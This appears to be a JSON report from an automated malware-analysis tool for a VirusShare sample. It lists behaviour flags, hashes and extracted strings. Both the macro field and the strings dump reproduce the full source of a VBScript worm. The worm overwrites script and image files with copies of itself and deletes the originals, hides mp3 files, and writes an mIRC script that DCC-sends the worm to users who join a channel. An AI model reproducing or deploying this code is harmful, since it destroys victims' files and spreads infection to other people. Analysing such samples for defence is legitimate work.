{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CreateObject": "May create an OLE object",
            "CreateTextFile": "May create a text file",
            "WINDOWS": "May enumerate application windows",
            "Wscript.shell": "May run an executable file or a system command",
            "run": "May run an executable file or a system command",
            "shell": "May run an executable file or a system command",
            "write": "May write to a file"
        },
        "macro": "Sub infect_files(folderspec)\nOn Error Resume Next\nDim f, f1, fc, ext, ap, mircfname, s, bname, mp3\nDim fso, file, shl\n  \nSet shl = CreateObject(\"Wscript.shell\")\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nSet file = fso.OpenTextFile(Wscript.ScriptFullName, 1)\n\n  Set f = fso.GetFolder(folderspec)\n  Set fc = f.Files\n\n  For Each f1 In fc\n      ext = fso.GetExtensionName(f1.Path)\n      ext = LCase(ext)\n      s = LCase(f1.Name)\n  If (ext = \"vbs\") Or (ext = \"vbe\") Then\n      Set ap = fso.OpenTextFile(f1.Path, 2, True)\n      ap.write vbscopy\n      ap.Close\n  ElseIf (ext = \"js\") Or (ext = \"jse\") Or (ext = \"css\") Or (ext = \"wsh\") Or (ext = \"sct\") Or (ext = \"hta\") Then\n      Set ap = fso.OpenTextFile(f1.Path, 2, True)\n      ap.write vbscopy\n      ap.Close\n      bname = fso.GetBaseName(f1.Path)\n  Set cop = fso.GetFile(f1.Path)\n      cop.Copy (folderspec & \"\\\" & bname & \".vbs\")\n      fso.DeleteFile (f1.Path)\n  ElseIf (ext = \"jpg\") Or (ext = \"jpeg\") Then\n      Set ap = fso.OpenTextFile(f1.Path, 2, True)\n      ap.write vbscopy\n      ap.Close\n  Set cop = fso.GetFile(f1.Path)\n      cop.Copy (f1.Path & \".vbs\")\n      fso.DeleteFile (f1.Path)\n  ElseIf (ext = \"mp3\") Or (ext = \"mp2\") Then\n      Set mp3 = fso.CreateTextFile(f1.Path & \".vbs\")\n      mp3.write vbscopy\n      mp3.Close\n  Set att = fso.GetFile(f1.Path)\n      att.Attributes = att.Attributes + 2\n  End If\n\n  If (eq <> folderspec) Then\n      If (s = \"mirc32.exe\") Or (s = \"mlink32.exe\") Or (s = \"mirc.ini\") Or (s = \"script.ini\") Or (s = \"mirc.hlp\") Then\n          Set scriptini = fso.CreateTextFile(folderspec & \"\\script.ini\")\n          scriptini.WriteLine \"[script]\"\n          scriptini.WriteLine \";mIRC Script\"\n          scriptini.WriteLine \"; Please dont edit this script duh... mIRC will corrupt, if mIRC will\"\n          scriptini.WriteLine \" corrupt... WINDOWS will affect and will not run understand???\"\n          correctly.thanks \"\"\n          scriptini.WriteLine \";\"\n          scriptini.WriteLine \";try this!\"\n          scriptini.WriteLine \";http://www.mirc.com\"\n          scriptini.WriteLine \";\"\n          scriptini.WriteLine \"n0=on 1:JOIN:#:{\"\n          scriptini.WriteLine \"n1= /if ( $nick == $me ) { halt }\"\n          scriptini.WriteLine \"n2= /.dcc send $nick\" & \"C:\\TempDir\\JMBNetGame.vbs\"\n          scriptini.WriteLine \"n3=}\"\n          scriptini.Close\n          eq = folderspec\n      End If\n  End If\n\n  Next\n"
    },
    "filename": "VirusShare_4979f78904d5bb3d8194231bb3178662",
    "filesize": 2455,
    "filetype": "ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "4979f78904d5bb3d8194231bb3178662",
        "sha1": "6bfd2b97e8b483d48aa38d38973d6c3786f3a036",
        "sha256": "0804176c2ec1a932cab038c8ac5b6726064e55e7d509ba65fb9d53898d3a8784"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "Sub infect_files(folderspec)",
            "On Error Resume Next",
            "Dim f, f1, fc, ext, ap, mircfname, s, bname, mp3",
            "Dim fso, file, shl",
            "Set shl = CreateObject(\"Wscript.shell\")",
            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
            "Set file = fso.OpenTextFile(Wscript.ScriptFullName, 1)",
            "  Set f = fso.GetFolder(folderspec)",
            "  Set fc = f.Files",
            "  For Each f1 In fc",
            "      ext = fso.GetExtensionName(f1.Path)",
            "      ext = LCase(ext)",
            "      s = LCase(f1.Name)",
            "  If (ext = \"vbs\") Or (ext = \"vbe\") Then",
            "      Set ap = fso.OpenTextFile(f1.Path, 2, True)",
            "      ap.write vbscopy",
            "      ap.Close",
            "  ElseIf (ext = \"js\") Or (ext = \"jse\") Or (ext = \"css\") Or (ext = \"wsh\") Or (ext = \"sct\") Or (ext = \"hta\") Then",
            "      Set ap = fso.OpenTextFile(f1.Path, 2, True)",
            "      ap.write vbscopy",
            "      ap.Close",
            "      bname = fso.GetBaseName(f1.Path)",
            "  Set cop = fso.GetFile(f1.Path)",
            "      cop.Copy (folderspec & \"\\\" & bname & \".vbs\")",
            "      fso.DeleteFile (f1.Path)",
            "  ElseIf (ext = \"jpg\") Or (ext = \"jpeg\") Then",
            "      Set ap = fso.OpenTextFile(f1.Path, 2, True)",
            "      ap.write vbscopy",
            "      ap.Close",
            "  Set cop = fso.GetFile(f1.Path)",
            "      cop.Copy (f1.Path & \".vbs\")",
            "      fso.DeleteFile (f1.Path)",
            "  ElseIf (ext = \"mp3\") Or (ext = \"mp2\") Then",
            "      Set mp3 = fso.CreateTextFile(f1.Path & \".vbs\")",
            "      mp3.write vbscopy",
            "      mp3.Close",
            "  Set att = fso.GetFile(f1.Path)",
            "      att.Attributes = att.Attributes + 2",
            "  End If",
            "  If (eq <> folderspec) Then",
            "      If (s = \"mirc32.exe\") Or (s = \"mlink32.exe\") Or (s = \"mirc.ini\") Or (s = \"script.ini\") Or (s = \"mirc.hlp\") Then",
            "          Set scriptini = fso.CreateTextFile(folderspec & \"\\script.ini\")",
            "          scriptini.WriteLine \"[script]\"",
            "          scriptini.WriteLine \";mIRC Script\"",
            "          scriptini.WriteLine \"; Please dont edit this script duh... mIRC will corrupt, if mIRC will\"",
            "          scriptini.WriteLine \" corrupt... WINDOWS will affect and will not run understand???\"",
            "          correctly.thanks \"\"",
            "          scriptini.WriteLine \";\"",
            "          scriptini.WriteLine \";try this!\"",
            "          scriptini.WriteLine \";http://www.mirc.com\"",
            "          scriptini.WriteLine \";\"",
            "          scriptini.WriteLine \"n0=on 1:JOIN:#:{\"",
            "          scriptini.WriteLine \"n1= /if ( $nick == $me ) { halt }\"",
            "          scriptini.WriteLine \"n2= /.dcc send $nick\" & \"C:\\TempDir\\JMBNetGame.vbs\"",
            "          scriptini.WriteLine \"n3=}\"",
            "          scriptini.Close",
            "          eq = folderspec",
            "      End If",
            "  End If",
            "  Next"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.mirc.com"
        ]
    },
    "time": "0:00:00.282249",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
